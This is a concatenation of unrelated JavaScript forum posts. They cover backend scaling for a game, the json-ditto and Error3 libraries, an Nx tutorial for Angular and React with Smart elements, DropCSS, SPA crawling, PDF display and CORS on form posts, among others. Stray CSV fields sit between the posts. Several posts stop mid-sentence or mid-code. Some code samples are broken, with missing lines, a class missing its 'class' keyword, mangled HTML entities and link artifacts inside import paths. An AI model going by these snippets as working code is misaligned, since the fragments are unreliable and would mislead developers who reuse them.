* Expected total installs initially (first 3 months) would be expected at 1 million and over lifetime it could go up to 5M. DAU could be around 100K. The game is gonna have a meta game as well, so it is expected that a player is gonna spend 50% of time in meta gameplay (no requests would be sent during this time) and 50% in isometric gameplay (where there would be requests to server for updates) in a given session. And a session length could be around 30 mins. For this, should we be prepared for sharding from the beginning? If so, I'd like to understand which is preferred (sharding at application layer vs db layer) and the reason for it.

I've good expertise in rails (6 years of working experience) and a decent one in server side javascript (nodejs, express and some modules attached to these)

My initial inclination was towards rails as I believe it solves the above problems well enough (please correct me if I'm wrong!). Although, I really liked the async style of processing in nodejs (I've developed some APIs on this), I'm not sure if has the feature rich MVC framework (I've used only express) such as rails.

Thank you very much for the patience of going through the above request!

JSON (JavaScript Object Notation) is a lightweight data-interchange format. It is easy for humans to read and write. It is easy for machines to parse and generate. When dealing with data integration problems, the need to translate JSON from external formats to adhere to an internal representation become a vital task. Ditto was created to solve the issue of unifying external data representation. Ditto needs to have a defined `.json` mapping file and exposes a Class to be implemented each service. Ditto will parse the mapping file and convert an existing JSON to match the rules defined in the mapping file.

# How to use Ditto

Ditto exposes a class that can be instantiated with a mapping file and/or plugins list. You can either use the `unify` method with the document you wish to unify with the mappings and plugins passed to the constructor.

```javascript
const Ditto = require('json-ditto');

// This is valid JSON mapping file that maps to the mapping rules below
const myCustomMappings = require('./myMappingFile');

// Create a new mapper that will always use the ""myCustomMappings"" file
const myCustomMapper = new Ditto(myCustomMappings);

// Call the unify function that will read the ""documentToBeUnified"" and transforms it via the mapping file
myCustomMapper.unify(documentToBeUnified).then((result) =&gt; {
    .....
});
```

or you can create a default instance and pass the document with the mappings to the `unify` function.

```javascript
const Ditto = require('json-ditto');

// This is valid JSON mapping file that maps to the mapping rules below
const myCustomMappings = require('./myMappingFile');

// Call the unify function that will read the ""documentToBeUnified"" and transforms it via the mapping file passed to the constructor
return new Ditto.unify(myCustomMappings, documentToBeUnified).then((result) =&gt; {
    .....
});
```

By default, you can use the built-in plugins provided with Ditto using the syntax defined below in your mapping. However, if you wish to register additional plugins you can use the following `addPlugins` method or you can pass the plugins to the constructor directly via `new Ditto(myCustomMappings, myCustomPlugins)`.

&gt; Note: Adding plugins extends and will not overwrite the default plugins

2637,2019-03-17 19:12:33,2,1," Create Angular and React Applications Together With Nx and Smart HTML Elements

 

Companies usually use more than one javascript framework. Today, most popular are Angular and React. With the help of NX, we can create full-stack applications and share code between the backend and the frontend.

### Creating a New Nx Workspace

We start by creating a new Nx workspace. The easiest way to do this is to use npx.

npx --ignore-existing create-nx-workspace myApp --preset=empty

### Creating an Angular Application

An empty workspace has no application or libraries: nothing to run and nothing to test. Let’s add an Angular application into it by running ng g app angularapp --framework=angular.

The generated main.ts  
, will look as follows:

import { enableProdMode } from '@angular/core';  


import { platformBrowserDynamic } from '@angular/platform-browser-dynamic';  
import { AppModule } from './app/app.module';  


import { environment } from './environments/environment';  


if (environment.production) {  
  enableProdMode();  
}  


platformBrowserDynamic()  
  .bootstrapModule(AppModule)  
  .catch(err =&gt; console.error(err));

And the template of the generated component will look as follows:

&lt;div style=""text-align:center""&gt;  
  Welcome to {{title}}!  
  &lt;img  
width=""300""  
src=""https://raw.githubusercontent.com/nrwl/nx/master/nx-logo.png""  
  /&gt;  
&lt;/div&gt;  


&lt;p&gt;This is an Angular app built with &lt;a href=""https://nx.dev""&gt;Nx&lt;/a&gt;.&lt;/p&gt; 

&amp;#x200B;

 

### Creating a React Application

Generating a React application is just as easy.

ng g app reactapp --framework=react  
 and this is what we will see:

Where main.ts  
 looks like this:

import \* as React from 'react';  
import \* as ReactDOM from 'react-dom';  


import { App } from './app/app';  


ReactDOM.render(&lt;App /&gt;, document.querySelector('myApp-root'));

and app.tsx   
contains the following component:

import \* as React from 'react';  
import { Component } from 'react';  


import './app.css';  


export class App extends Component {  
  render() {  
const title = 'reactapp';  
return (  
&lt;div&gt;  
&lt;div style={{ textAlign: 'center' }}&gt;  
&lt;h1&gt;Welcome to {title}!&lt;/h1&gt;  
&lt;img  
width=""300""  
src=""https://raw.githubusercontent.com/nrwl/nx/master/nx-logo.png""  
/&gt;  
&lt;/div&gt;  
&lt;p&gt;  
This is a React app built with &lt;a href=""https://nx.dev""&gt;Nx&lt;/a&gt;.  
&lt;/p&gt;  
&lt;/div&gt;  
);  
  }  
}

**Nx has first-class React support, so all the commands we use to develop Angular applications work for React as well:**

* ng serve reactapp  
 serves the React app
* ng build reactapp  
 builds the React app
* ng test reactapp  
 tests the React app using Jest
* ng e2e reactapp-e2e  
 tests the React app using Cypress

TypeScript support, Jest, Cypress, source maps, watch mode — all work with

### Install Smart Web Components

Run: npm i @smarthtmlelements/smart-elements

### Using the Smart Custom Elements in our Angular App

#### Setting Target to ES2015

To use the Smart Web Components  
 in the Angular app, let’s start with changing the output target to es2015 in tsconfig.json  
 because Custom Elements requires ES2015 Classes.

{  
  ""extends"": ""../../tsconfig.json"",  
  ""compilerOptions"": {  
""target"": ""es2015"",  
""types"": \[""node"", ""jest""\]  
  },  
  ""include"": \[""\*\*/\*.ts""\]  
}

#### Importing the Library

Next, let’s include the new library in app.module.ts.

import { BrowserModule } from '[@angular/platform-browser](http://twitter.com/angular/platform-browser)';  
import { NgModule, CUSTOM\_ELEMENTS\_SCHEMA  } from '[@angular/core](http://twitter.com/angular/core)';import { AppComponent } from './app.component';  
import '[@smart](http://twitter.com/smart)\-elements'; // &lt;-- the new library[@NgModule](http://twitter.com/NgModule)({  
  declarations: \[AppComponent\],  
  imports: \[BrowserModule\],  
  providers: \[\],  
  schemas: \[CUSTOM\_ELEMENTS\_SCHEMA\],  
  bootstrap: \[AppComponent\]  
})  
export class AppModule {}

#### CUSTOM_ELEMENTS_SCHEMA

CUSTOM\_ELEMENTS\_SCHEMA   
tells the Angular compiler not to error when seeing non-standard element tags in components’ templates.

#### Using Smart ListBox Element with Angular

Open app.component.html and add the &lt;smart-list-box&gt; Web Component to it. Smart-ListBox is part of [https://www.htmlelements.com](https://www.htmlelements.com/) Web Components UI Toolkit.

&lt;div style=""text-align:center""&gt;  
  &lt;h1&gt;Welcome to {{ title }}!&lt;/h1&gt;  
  &lt;img  
width=""450""  
src=""[https://raw.githubusercontent.com/nrwl/nx/master/nx-logo.png](https://raw.githubusercontent.com/nrwl/nx/master/nx-logo.png)""  
  /&gt;  
&lt;/div&gt;&lt;p&gt;This is an Angular app built with &lt;a href=""[https://nx.dev](https://nx.dev/)""&gt;Nx&lt;/a&gt;.&lt;/p&gt;  
&lt;p&gt;ðŸ”Ž \*\*Nx is a set of Angular CLI power-ups for modern development.\*\*&lt;/p&gt;&lt;h2&gt;Smart ListBox Web Component&lt;/h2&gt;  
 &lt;smart-list-box&gt;     
&lt;smart-list-item value=""Bulgaria""&gt;Bulgaria&lt;/smart-list-item&gt;    
&lt;smart-list-item value=""United Kingdom""&gt;United Kingdom&lt;/smart-list-item&gt;    
&lt;smart-list-item value=""United States""&gt;United States&lt;/smart-list-item&gt;    
 &lt;/smart-list-box&gt;

#### Updating angular.json and tsconfig.json

Now, open angular.json and add the smart.default.css Style to

""styles"":   
   \[  
""apps/angularapp/src/styles.css"",   
""node\_modules/@smarthtmlelements/smart-elements/source/styles/smart.default.css""  
   \],

Update the tsconfig.json to add the @smart-elements path which we use.

{  
  ""compileOnSave"": false,  
  ""compilerOptions"": {  
""sourceMap"": true,  
""declaration"": false,  
""moduleResolution"": ""node"",  
""emitDecoratorMetadata"": true,  
""experimentalDecorators"": true,  
""importHelpers"": true,  
""target"": ""es5"",  
""module"": ""es2015"",  
""typeRoots"": \[""node\_modules/@types""\],  
""lib"": \[""es2017"", ""dom""\],  
""skipLibCheck"": true,  
""skipDefaultLibCheck"": true,  
""baseUrl"": ""."",  
""paths"": {  
""[@smart](http://twitter.com/smart)\-elements"": \[""node\_modules/@smarthtmlelements/smart-elements/source/smart.elements.js""\],     ""[@smart](http://twitter.com/smart)\-elements-css"": \[""node\_modules/@smarthtmlelements/smart-elements/source/styles/smart.default.css""\]    }  
  },  
  ""exclude"": \[""node\_modules"", ""tmp""\]  
}

Run: ng serve angularapp

&amp;#x200B;

 

### Using the Smart ListBox Element in our React App

This requires similar steps.

#### Setting Target to ES2015

Let’s change the target to es2015 in tsconfig.json

{  
  ""extends"": ""../../tsconfig.json"",  
  ""compilerOptions"": {  
""jsx"": ""react"",  
""target"": ""es2015"",  
""allowJs"": true,  
""types"": \[""node"", ""jest""\]  
  },  
  ""include"": \[""\*\*/\*.ts"", ""\*\*/\*.tsx""\]  
}

#### Importing Library

Next, let’s include the new library in main.tsx  
.

import \* as React from 'react';  
import \* as ReactDOM from 'react-dom';import { App } from './app/app';import '[@smart](http://twitter.com/smart)\-elements';ReactDOM.render(&lt;App /&gt;, document.querySelector('myApp-root'));

Open app.tsx and add smart-list-box to it  
.

import \* as React from 'react';  
import { Component } from 'react';import './app.css';  
import '[@smart](http://twitter.com/smart)\-elements-css';export class App extends Component {  
  render() {  
const title = 'reactapp';  
return (  
&lt;div&gt;  
&lt;div style={{ textAlign: 'center' }}&gt;

src=""[https://raw.githubusercontent.com/nrwl/nx/master/nx-logo.png](https://raw.githubusercontent.com/nrwl/nx/master/nx-logo.png)""  
/&gt;  
&lt;/div&gt;  
&lt;p&gt;  
This is a React app built with &lt;a href=""[https://nx.dev](https://nx.dev/)""&gt;Nx&lt;/a&gt;.  
&lt;/p&gt;

&lt;/div&gt;  
);  
  }  
}

Run: ng serve reactapp

&amp;#x200B;

I am new to web development and wanted to ask for a feedback to my current kotlin fullstack project.

I have some javascript development experience and I already understood how fragile and difficult to maintain (compared to backend code) plain javascript can be.

Recently when KotlinJS was released i gave it a try and migrated all javascript code to kotlin. It's day and night - no more programming by trial and errors - you write it and (when compiled) it just works as expected.

The setup is very straightforward - 2 gradle modules: 

* spring boot kotlin rest backend
* kotlinj2 module that after compilation goes to backend/resources/static and gets hosted by springboot
* couple of manual tasks in gradle build

That's it - you just run gradle task 'run'. The link to the repo  [https://github.com/demoth/kotlinfullstack](https://github.com/demoth/kotlinfullstack) 

I have no experience with NPM world and react/angular frameworks and may not see obvious pitfalls of frontend development so I ask you guys for a feedback.

The setup currently lacks obfuscation and minification and not for full scale production use (at least in it's current form)

* Average Read Time (English) — 265 Words per min
* Average Read Time (Chinese, Japanese and Korean) — 500 Characters/min
* Image Read Time — 12 seconds for the first image, 11 for the second, and minus an additional second for each subsequent image. Other images counted at 3 seconds. (in decreasing arithmetic progression)

I've been trying to set up a website that plays a random .webm that  loops, then when you press a key, it plays the next random .webm. I got  the random part down, but I can't seem to figure out how to get it to  wait for the keystroke. Another issue I'm having is that I can't figure  out how to get it to load a random .webm when the site is first visited.  It just plays the first video (1.webm) I'm sorry if this is a bad  question, I'm very new to web development.

I tried to make it so that when the key is pressed it would load a new .webm, but it didn't work. 

Here's what I have:

2683,2019-04-02 02:55:31,0,1," Hi everyone!  
I'm working on some javascript exercises and can't figure out my mistake in 2 places.

First, I'm trying to create a trim left logic. I want the program to skip the white spaces until the first character appears. How do I get a loop to start only when another function stops happening?

Second, I have this code:

&amp;#x200B;

*Processing img khngixnhmrp21...*

The idea is to remove all white space before the non-white space character and the last, while not removing any between them. What it does, however, is remove every consecutive white space except for one. As in "" pot    ato "" becomes ""pot ato"" instead of ""pot    ato"".

2694,2019-04-06 06:45:38,10,6,"[Error3](https://github.com/rumkin/error3) helps you build error strategy for your App. Here it is a list of advantages of Error3 over the native JS Error object.

What is Error3. It is an extended error object which has additional properties: `code`, `details`, `errors` and `format()`
* `code` is number or string error code.
* `details` is object, containing values describing the error cause.
* `errors` is an array of errors which caused this error. It's using for wrapping library errors into application errors.
* `format()` is a method which converts `details` and `errors` in string.

This all gives us the next advantages over Error:

1. It's easy to compare error codes using strict equality operator. What makes error handling robust.
2. Codes could be used as part of URL. In documentation for example.
3. Details are stored as primitives though they could be used to produce custom output, e.g. highlighting.
4. Error message could use Intl to produce localized message text.
5. Error message could be modified for environment purposes.
6. Shorten error invocation code.
7. It's network friendly. Error could be easy restored and represented on the client side using from code and details.

**Sample**.

Code taken from readme:

```javascript
import Error3 from 'error3'
 
class NotFoundErr extends Error3 {
  code = 'fs_not_found'
 
  format({filepath}) {
    return `File ""${filepath}"" not found`
  }
}
```

Usage:

```javascript
const error = new NotFoundErr({ filepath: './index.js' });

error.toString() // -&gt; ""NotFoundErr: [#fs_not_found] File ""./index.js"" not found""
error.message // -&gt; ""File ""./index.js"" not found""
error.code // -&gt; fs_not_found
error.details // -&gt; {filepath: './index.js'}
```

**Examples**.

**Enhanced example**.

Building server apps I create 3 categories of Errors: Access, BadParams and Runtime. Which represents permission access violation, invalid request or user input and unknown kind of errors which were thrown while request handling.

export class Runtime extends MyAppError {} // 503 Error

export InvalidJson extends BadParams {

  format() {
    return 'Syntax error in json'
  }
}

export UserNotFound extends BadParams {
  code = 'user_not_found'
  status = 404

  format({userId}) {
    return `User #${userId} isn't found`
  }
}

export AuthRequired extends Access {
  code = 'authorization_required'
  status = 401

  format() {
    return `Authorization data is required`
  }
}

export RoleViolation extends Access {
  code = 'role_violation'

    return `Required role is ${role}`

}

DropCSS v1.0.0 is ready!

https://github.com/leeoniya/dropcss

With this milestone I've successfully scratched a 30 day itch.

I'm sucker for small, fast and effective tools. For the prior 6 months I was using PurgeCSS to remove unused CSS from my stylesheets because it was the fastest lib available for the task and was a reasonably small devDependency in my toolbelt. I only ever took a cursory look at its minified output and concluded that it was ""quite good"". That was until I discovered Chrome's excellent code coverage panel [1] which revealed how much junk PurgeCSS was leaving on the table [2]. Reluctantly, I tried some heavier CSS purging solutions but they were much bulkier, slower and had other gaps in thoroughness. I was annoyed and decided to see what could be cobbled together from existing low level tools (HTML parser, CSS parser and CSS query/selector), because there's no way in hell I was going to write any of those better than established projects. After much research and testing I settled on 3 small dependencies to get me to the promise land (2.16 MB combined). A few days later I had something that was much more thorough than anything I've used previously and 40% the speed of PurgeCSS, yay! I announced my victory with an alpha version here and HN 20 days ago [3][4]. However, I was confident that with some clever optimizations, caching and refinement I could attain PurgeCSS speeds. Soon, I tried to process some enormous content as a stress test (1.28 MB of HTML and 312 KB of minified css). While PurgeCSS didn't do a fantastic job at cleaning, it finished in 350ms. DropCSS took 18s. Yikes, there was some exponential shit hiding in the weeds, but the source of DropCSS itself was only 60 lines of glue between the deps. Surely, caching was the solution, and after some effort I cut the time down to 10s. Futher digging revealed that what I needed was the ability to cache and optimize in the lower layers (the dependencies). No, this wasn't going to work. DEAD END :_(

The following day I woke up, had some coffee and thought, ""Fuck it, FROM ZERO!"" And so, I coded two minimal and efficient tokenizers &amp; parsers - one for CSS, another for HTML. I then wrote a fast CSS selector parser/querier with space-efficient caches. Next was a ton of tests, a build infrastructure and coverage reporting. Afterwards, bugs were fixed, regression tests and more profiling and optimizations. Finally, I added unused @keyframes and @font-face purging, even though this is somewhat beyond the scope, but other tools do it poorly. This has been my past 2 weeks after my 9-5, with some very late nights, or was it early mornings?

Anyways, the final product:

- 8 KB (min), 0 deps, runs in the browser and Node
- The most thorough removal of any lib I've tested
- 4x perf vs PurgeCSS, 9x or more vs everything else
- Dead-simple, minimal API
- $0.00

TBH, I wasn't expecting such run-away success (my goal was PurgeCSS perf but properly thorough). I'm certain that very shortly some 10x dev will write a WASM version compiled from C or Rust to put my heroic efforts into proper perspective, but until then I'll take my few victory laps :D.

I am having trouble finding anything, that states in words simply enough for me, on how to search each document in teams, where one of memberEmails child is equal to the current authenticated user email. If the current users email is found in the memberEmails, return the name of that team.

So I am a bit stuck with a site I'm building. I figured I would just go the route of using vanilla html, css, and javascript (because I have no clue how to use react or anything like that, and It seems very difficult when I tried to learn it for a month) to build this site idea I have, and then use a javascript backend or something. 

First off, I want to integrate Google Maps to my website, which i have done already. I have a map that is the right size now and it works well, I got my api key, etc. 

What I want to do is have users be able to place markers at any place on the map they want and if another user clicks their marker it will show them coordinates to go to that place. I am not quite sure where to even begin with this kind of thing because I am sort of intermediate with Javascript (I know html, css, flexbox) but know nothing about Google maps api or how to place multiple markers. I went to research this and I am still stuck because what I found didn't help and broke my map, so I started back at square one.

&amp;#x200B;

Secondly, (possible optional) I want a search bar integrated at the top so that users can search locations around the world if they don't know how to use a map

I would also like for them to be able to click on a marker and get the best route to the area just like maps does.

2707,2019-04-10 11:31:57,1,1," 

I want my news website to be crawled by Google, but it is a SPA, so I am planning to offer pre-rendering for bots.

I found a problem when I thought of paginating news posts by infinite scrolling. Even through pre-rendering, crawlers would only see news posts that are initially rendered before scrolling to the bottom. So I decided to offer a ""See More"" button that is wrapped by an &lt;a&gt; tag. In that way, I can keep &lt;a&gt; tags for news posts in my websites after the news become outdated.

So, if a Google bot enters my site, I would offer a pre-rendered static page from the server including a ""See More"" button. It is linked by &lt;a&gt;, although it is initially rendered by React. React will render the &lt;a&gt; tag and my server will render the React and it will be sent to a crawler. If the bot clicks the ""See More"" button, &lt;a&gt; tag should lead it to [https://site.com/page/2](https://site.com/page/2). Since what bot sees is a static HTML page, React Router should not work and the request should go directly to the server, and the server will return another pre-rendered HTML page for [https://site.com/page/2](https://site.com/page/2). Did I understand correctly? Is there anything I am missing?

I was also wondering if I should number pages in a reverse order to avoid changing page numbers as entries for news posts. So I was thinking to start page from 31432 rather than page 1 for the first list of news post. Do I think correctly?

I am curious about how other websites deal with this problem, so I looked up famous news websites, but could not find pagination in their websites. I did find that they order their posts sorted by dates. But there was no pagination. I do not know how they are able to keep links to the news once they are outdated. I am curious about how Facebook, Medium, Reddit work. These website do not work without javascript and Facebook has infinite scrolling, but they have no problem with getting crawled their public pages. Can anybody help me to understand how to achieve this?

`$(add_button).click(function(e) {`

This app handles our timesheets, incident reports, and various other things. This app was outsourced to an overseas dev before I joined the company, and my boss was never given any source code for this app only the .apk file. 

&amp;#x200B;

I've decompiled the .apk, and I see that time timesheets portion is basically an html file, linked to a javascript that then produces a .pdf that is emailed to the various supervisors for approval. Since this is a union shop (for the field guys at least), each employee has three attributes in the timesheet. Their union badge id, their union class, and their name. 

&amp;#x200B;

These change quite regularly due to promotions &amp; hirings and I would like to get away from manually added these to the app, recompiling, and pushing them to all 200+ tablets. What I've been trying to do is take those hardcoded arrays and maybe link them to an excel file, or something, that lives off the device. Maybe on our company dropbox, or hosted somewhere else. 

&amp;#x200B;

I come from an Objective-C and Python background, and have only dabbled with Javascript very little in the past. the code is basically this:

`var badgelist = [""Array"", ""Of"", ""About"", ""200"",""IDs""];`

`var classlist = [""Array"", ""Of"", ""About"", ""200"",""classes""];`

`var nameless = [""Array"", ""Of"", ""About"", ""200"",""names""];`

`for (i = 0; i &lt; badgelist.length; i++) {`

I'm in no way a javascript expert, rather a casual : I'm a backend developer tasked with some front-end dev here and there for testing purposes mainly.

Currently I'm tasked with making a web app allowing an user to fill in information, then the backend should generate a pdf.

I'd like to display said pdf in the browser.


I've spent a stupid time trying to access the file which, since we are in development, is currently on the local machine. 

I've just now discovered you can't actually access local files from javascript code, and I guess (but with no certainty) that this is the reason of my issue.

I've been trying vue-pdf and pdfvuer, both libraries built upon pdf.js from mozilla. You have to pass a file to the src attribute, so I tried to give it ""c:\pdf\myFile.pdf"".... and got ""DataCloneError: The object could not be cloned.""


Would anyone have any idea how I'm supposed to fix that ? What path in the seven hell am I supposed to pass ? My backend obviously won't save the file in the folders of the frontend; so how can I pass a non-local path for that file ? :/

I am trying to use javascript to color code each letter  


The image I attached is basically what I am trying to do, however when I put the code in my static github page website (on a specific page) it only showed the text, but without the **red ""e""**  


I was stoked the moment I was able to have some javascript work on my page, which is mostly html and css  
I understand the javascript is supposed to be contained within the &lt;script&gt; &lt;/script&gt; tags

Also I am trying to change the colors of each letters on this ""practice"" website I borrowed the code from (same as image)  


[http://jsfiddle.net/vzxebauw/](http://jsfiddle.net/vzxebauw/)  


However I cannot find a way to color code each letter, when I create a new variable and do what I instinctually think is correct, it doesn't work

  
var **text** = $(""#phrase"").html().replace(/**e**/g, '&lt;span class=""**red**""&gt;**e**&lt;/span&gt;');   

   $(""#phrase"").html(text)

my new variable:  


var **a** = $(""#phrase"").html().replace(/**a**/g, '&lt;span class=""**green**""&gt;**a**&lt;/span&gt;');

* **Javascript** has broken out of the browser and become a general purpose programming language for both web and mobile. We purposely chose Javascript as the language of choice on 8base, rather than the closed approaches competitors take with their proprietary programming languages.
* A more sophisticated user base - 49% of Javascript users have been using the language for more than 5 years now.
* **GraphQL** is set for a boom - 23% of developers have already started using GraphQL, but 49% of all npm users are considering using it in 2019 (that’s 72% overall!). One of 8base’s core features it its powerful GraphQL API.
* **React’s** growth continues to dominate - 63% of developers use React, up 5% year over year. This makes React more than twice as popular as the next-biggest front-end framework, Angular. React and its ecosystem of complementary technologies dominate web, mobile, and desktop development in the npm community. 8base is built in React and supports development in React through its SDK.
* **TypeScript** gains momentum - 61% of all JavaScript developers report using TypeScript, an impressive 31% increase in usage since npm’s last survey. 8base supports development in either standard Javascript or Typescript.
* **Serverless** is gaining serious momentum - 56% of respondents deploy using containerization technologies, and a surprising 33% of respondents already use “serverless” or “cloud functions” to deploy code. 8base utilizes serverless and also supports the development and execution of serverless functions.","Trends and Analysis for Javascript, Typescript, React, GraphQL and Serverless"

2804,2019-05-09 01:04:15,0,1,"This is a tiny trick which could be useful when you need to resolve paths and make it crossplatform. This code has no dependencies what makes its' usage extremely simple and cheap. Such code could migrate from Node.js to a browser without dependencies bundling (no browserify, rollup or whatever is needed).

The trick is in using `file:` as protocol in URL constructor.

Well, let's take example:

```javascript
const path = require('path')

const absPath = path.resolve('file:///some/root', '../../index.js')
```

And replace it with:

```javascript
const absPath = new URL('../../index.js', 'file:///some/root').pathname
```

Built-in `fs` module accepts [URLs as path](https://nodejs.org/dist/latest-v12.x/docs/api/fs.html#fs_url_object_support). Thus in cases when you need to use resolved path within the module, it's possible to simplify example as follows:

```javascript
const absPath = new URL('../../index.js', 'file:///project/root')
// ... then pass absPath somewhere: fs.readFileSync(absPath, ...
```

Happy coding.",Trick how to replace path module with URL for path resolution

Those recent years Functional Programming paradigms became more present in the JavaScript ecosystem. From the first functional approach I saw from `underscore` library, many years passed, and we are now at a place where many of us see the benefits in writing code this way and immutabilty in mind.  
Still all the functional jargon can be a barrier for beginners. Not only individuals that want to get their heads into FP, but also teams that have use-cases of complex data manipulation and don't see the benefit from using a FP library.  
So I wanted to help sharing an easy to use UI, inspired in [Array Explorer](https://sdras.github.io/array-explorer/) by @sarah\_edo  
When I was digging into `ramda`, I found the [Ramda documentation](http://ramdajs.com/docs/) has a list of all the methods and some crazy examples in addition to a more helpful a wiki resource: [What-Function-Should-I-Use](https://github.com/ramda/ramda/wiki/What-Function-Should-I-Use) that I still use from time to time.  
So, I decided to help and create a little UI to interactively find the method that works for you.

I have recently come across a bit of a dilemma at work and I'm hoping someone can help me understand what is going on here. 

&amp;#x200B;

I have a form that takes credit card information. The form itself is an html form with an action url (to a site that I DO NOT control) that takes the data and sends it via this html method (not exactly sure how that works under the hood) and posts it to the url. Within the form-data, a returnUrl is sent and somehow the payment processing site (that i do NOT control) will then re-direct BACK to the confirmation site of our app.

&amp;#x200B;

The entire app is written in React EXCEPT for this part. 

&amp;#x200B;

Now comes the part I'm not sure I understand. Naturally I've tried to take what this form is doing and use javascript/react to accomplish it. However, when using axios, I receive CORS error. Posting with a regular form? No problem. Using javascript to make this requet? CORS, every time.

&amp;#x200B;

2. what is the underlying cause for these two things to have a different result from the server?",posting form data via html vs axios - CORS

**5.** Have you been asked about server-side JavaScript? \*

**a.** Node (Modules)

**b.** Event Loop

**c.** Streams

**d.** Express (Koa, Hapi)

i0 is a framework that focuses on simplifying components. Here are a few reasons I like i0. Obviously this is all my opinion, please don't nerdgasm all over me. (be constructive if possible)

It separates the Javascript from the HTML
- As a long time angular user, I find that angular is a layer with vocabulary of its own. Html felt like angular-html. The typescript felt like angular-typescript, and there were a large amount of files that needed to be accounted for and passed to each other.

i0 only exports 4 major useful functions
- in i0, you define a component, call the component, turn on the router, or subscribe to data. The rest of the available functions are utilities, such as guid/hide/show/clear.

i0 is online ide friendly

Coming from javascript I would sometimes replace a lengthy array with something shorter to speed things along like so:

for(let i = 0; i &lt; SomeArrayName.length; i++) {

  let arr = SomeArrayName\[i\]; // &lt;-- to shorten it here

  ctx.fillRect(arr.x, arr.y, arr.s, arr.h)  // &lt;-- happier without typing all of the full name

}

Is there something similar I can do in c++ ? I'm not sure what datatype to use when I would do int arr = SomeArrayName\[i\] for substitution? I guess I'm tired of typing:

for(size\_t = 0; i &lt; SomeArrayName.size(); i++) {

  newBall.setPosition(SomeArrayName\[i\].x, SomeArrayName\[i\].y); // &lt;-- so friggin' long I need to \*sigh\* and curse or something

Working on a form part of an assignment for a javascript basics unit.

The assignment wants a form with two fieldsets one for user info like name, email, and post code. The second payment type, card no., expiry, and ccv.

The month and year for card expiry had to be done in a drop down list as per the assignment requirements.

The code i am having difficulties with below is meant to validate the month and year of the card expiry against the current month and year. I'll also include my full js code as well

    if (currMonth  == month &amp;&amp; currYear == year)

2877,2019-05-30 18:27:28,5,7,"I have been coding or running dev teams for over 20 years and have coded, supported, maintained c++, c#, vb, vn.net, vbscript, javascript, jscript, tsql, mysql, mssql, and many more I have forgotten.

I have worked on every level of the techstack.  From db to ui, APIs, , ETLs, utilities, desktop, web, mobile, appliances.  

Never worked on something I could figure out.  Never worked with anything that I didnt eventually master (or almost master).

Did 4yrs as a computer science major but dropped out to take a y2k gig.  I only had two more classes to take but the cost of another semester vs y2k coin made me short sided. 

With that I consider myself self tought because I dont have a diploma and 90% of my skills comes from 20yrs in the trenches. However, the education kept me balanced between the wild west, cutting edge, and either following or defining best practices.  My work has always stayed outfront but was always stable.

 In addtion, my 20yrs also tells me I am no savant and have hired many programmers that could code circles around me. So I dont consider myself an uber geek that lives, eats and drinks this stuff.   But I hold my own am a above average senior developer responsible for many multimillion dollar product launches over the years.

I left the rat race 4yrs ago after my second major burnt out.  Sick of CEOs, BODs, Sales Teams, Budgets, Staffing and all the BS that goes into running a software company.  For those that are busting code for six figures... just stay there.  Don't climb the ladder there is nothing up there.  It never gets better than those eating pizza, drinking mountain dew and stepping through your final unit test nights.  Having your shit compiled and checked in is the only true nirvana.

Anyway, I have opened a few other businesses just to get away from it all and the last four years have been great.  But I REALLY miss coding. I missed it even before leaving the rat race.  My last couple of years I pretty much only did code reviews to make sure my teams stayed on point or if I got lucky there was something small on the board I could do to help burn down the sprint.  But what it really comes down to is  I miss building something that people use and then look at you like 'thats f'n cool!'   Thats it.  Just that look of amazement and gratitude when you make someone's life easier.  I want to see that a few more times before its too late.

 With that and for more reasons that will fit on this post, I have a couple of small projects that I want to build using python. 

 I have looked around at resources trying to find the best leaping off point but most of them are either far too out front or start out explaining what a variable is...  I need something that shows me all the moving parts, what goes where and why.  Add in a easy reference guide and some syntax libraries and that would rock.  But I am not sure this exists. 

 I figured I would post here to see what reddit had to say about a guy with my background that wanted to build a real commercial minimal viable product using python.  Where should I learn/start.

My big issue here is that I dont know how I can pick and choose the data from the JSON in the console.  Ive been able to find stuff that shows how to do it from a json file...but i dont know how I can get this into a file either

Is taking this JSON and getting data from the KEYS I want and putting into HTML possible they current way i have done so far?

is there a better way of doing this?

  
Like i said im not well versed in any of this  I just dabble in things to try to get a better understanding

I can fill in the blanks whereever needed if something isnt clear

These are by number a lot more common.

I've also found quite a few poorly handled places where content or components are being rendered or removed from the dom rather than simply using CSS. Which seems to be terrible waste of resources, as to trust javascript to load chunks of content rather than let C++ or in case of FF Rust handle it seems to be profoundly wasteful idea.

2896,2019-06-05 11:08:26,9,2,"I'm a javascript developer, who's dabbled in python. I was scrolling through the javascript subreddit, when I came across a post asking people to state why javascript was better than python. A few days later, I decided that for every reason a JS dev could criticize python, there's an equally good way for a Pythonista to criticize JS. 

There's often a lot of hate and criticism between the two languages, as they are consistently competing for the top spot as world's most used programming language (congrats Python!). Anyway, I feel like all this criticism is because both communities haven't talk to the other one. Python and Javascript have a lot in common:

Dynamically Typed: Both languages use dynamic types, and stay away from the confines of static typing. While python's use of strong typing is safer, there's also times when javascript's coercion can help you out. 

Multi-Paradigm: Both Python and Javascript can be functional, object-oriented, or in the worst designs, imperative. Both support immutable data collections (through tuples (and other objects found in the standard library),and `Object.freeze`), have first class functions, and have an object-literal like syntax. (Dictionaries + classes can form JS styles object literals, while JS object literals can act as data storage data structures (Anyone heard of JSON? That's the in the next section). 

Similar Data Structures: Both Python and Javascript have similar types:

Python  Javascript

`float  number`

`string string`

`bool   boolean`

`tuple  frozen array`

`list   Array`

`dict   Map/WeakMap or Object`

`set   Set`

`function Function`

`generator Generator`

Executable Across the Full Stack: Javascript works on the client side and the server, and Python has had major success as a server side language. In fact, Python is beginning to come to the browser with projects like Brython.

Metaprogramming: Both languages support metaprogramming capabilities, in Python with dunder methods and in javascript through `Symbol` and `Proxy`. 

Ever-Evolving: Javascript is updated every year, and Python updates come very frequently too. Both languages evolve and change, introducing new powerful features. This is different than say, Java, which updates slowly, and rarely introduces anything but syntactic sugar in its updates (Those shiny ""LAMBDA"" expressions are not real functions).

Huge Ecosystems: Both PyPy and NPM offer thousands of packages for use. They're used frequently in nearly any Python project, and any Javascript project larger than a few hundred lines of code.

So, while python and javascript are very different, they are both important languages pioneering the future. And collaboration between their communities will diffuse the hate and misassumptions about both languages.  That's why I have created a subreddit for Python and/or Javascript conversations, where asking questions about each of the languages is encouraged, and where creations in either (or both) of them can be displayed.

* swiperContainer - HTMLElement or string (with CSS Selector) of swiper container HTML element. Required.
* parameters - object - object with Swiper parameters. Optional.

&amp;#x200B;

Like this:

    &lt;body&gt;
      ...
      &lt;script&gt;
      var mySwiper = new Swiper ('.swiper-container', {
        // Optional parameters

        loop: true,
    
        // If we need pagination

          el: '.swiper-pagination',
